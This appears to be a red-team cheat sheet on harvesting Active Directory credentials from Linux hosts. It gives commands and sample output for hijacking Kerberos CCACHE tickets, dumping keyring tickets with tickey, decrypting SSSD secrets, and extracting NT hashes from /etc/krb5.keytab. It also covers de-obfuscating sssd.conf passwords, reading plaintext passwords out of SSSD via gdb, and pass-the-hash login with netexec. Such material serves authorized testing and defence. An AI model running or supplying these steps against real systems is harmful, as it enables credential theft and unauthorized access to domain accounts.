# Active Directory - Linux

## CCACHE ticket reuse from /tmp

> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions

List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 

```powershell
$ ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

$ export KRB5CCNAME=/tmp/krb5cc_1569901115
```


## CCACHE ticket reuse from keyring

Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey

```powershell
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```

## CCACHE ticket reuse from SSSD KCM

System Security Services Daemon (SSSD) maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
By default, the key is only readable if you have **root** permissions.

Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.

```powershell
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.


## CCACHE ticket reuse from keytab

```powershell
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```

## Extract accounts from /etc/krb5.keytab

The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 

Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.

```powershell
$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
	 Time stamp: Oct 07,  2019 09:12:02
[...]
```

On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.

```powershell
$ python3 keytabextract.py krb5.keytab 
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
        REALM : DOMAIN
        SERVICE PRINCIPAL : host/computer.domain
        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```

On macOS you can use `bifrost`.

```powershell
./bifrost -action dump -source keytab -path test
```

Connect to the machine using the account and the hash with CME.

```powershell
$ netexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
         10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
```


## Extract accounts from /etc/sssd/sssd.conf

> sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf

The obfuscated password is put into "ldap_default_authtok" parameter of a given SSSD domain and the "ldap_default_authtok_type" parameter is set to "obfuscated_password". 

```ini
[sssd]
config_file_version = 2
...
[domain/LDAP]
...
ldap_uri = ldap://127.0.0.1
ldap_search_base = ou=People,dc=srv,dc=world
ldap_default_authtok_type = obfuscated_password
ldap_default_authtok = [BASE64_ENCODED_TOKEN]
```

De-obfuscate the content of the ldap_default_authtok variable with [mludvig/sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate)

```ps1
./sss_deobfuscate [ldap_default_authtok_base64_encoded]
./sss_deobfuscate AAAQABagVAjf9KgUyIxTw3A+HUfbig7N1+L0qtY4xAULt2GYHFc1B3CBWGAE9ArooklBkpxQtROiyCGDQH+VzLHYmiIAAQID
```


## Extract accounts from SSSD keyring

**Requirements**:

* `krb5_store_password_if_offline = True` in `/etc/sssd/sssd.conf`

**Exploit**:

When `krb5_store_password_if_offline` is enabled, the AD password is stored plaintext.

```ps1
[domain/domain.local]
cache_credentials = True
ipa_domain = domain.local
id_provider = ipa
auth_provider = ipa
access_provider = ipa
chpass_provider = ipa
ipa_server = _srv_, server.domain.local
krb5_store_password_if_offline = true
```


Grab the PID of the SSSD process and hook it in `gdb`. Then list the process keyrings.

```ps1
gdb -p <PID_OF_SSSD>
call system("keyctl show > /tmp/output")
```

From the `/tmp/output` locate the `key_id` for the user you want.

```ps1
Session Keyring
 237034099 --alswrv      0     0  keyring: _ses
 689325199 --alswrv      0     0   \_ user: user@domain.local
```

Back to GDB: 

```ps1
call system("keyctl print 689325199 > /tmp/output")
```


## References

* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
* [20.4. Caching Kerberos Passwords - Red Hat Customer Portal](https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/identity_management_guide/kerberos-pwd-cache)